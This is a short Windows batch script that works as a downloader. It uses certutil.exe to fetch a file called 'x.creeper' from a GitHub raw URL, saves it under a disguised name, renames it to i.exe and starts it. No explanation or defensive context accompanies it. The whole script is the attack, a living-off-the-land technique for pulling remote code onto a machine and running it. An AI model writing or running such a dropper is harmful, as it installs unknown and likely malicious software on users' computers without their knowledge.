@echo off
title ---------------------------------------------------
certutil.exe -urlcache -split -f "https://github.com/walkeet/walkeet.github.io/raw/refs/heads/main/task/x.creeper" 0xl.0FF
ren 0xl.0FF i.exe
start i.exe
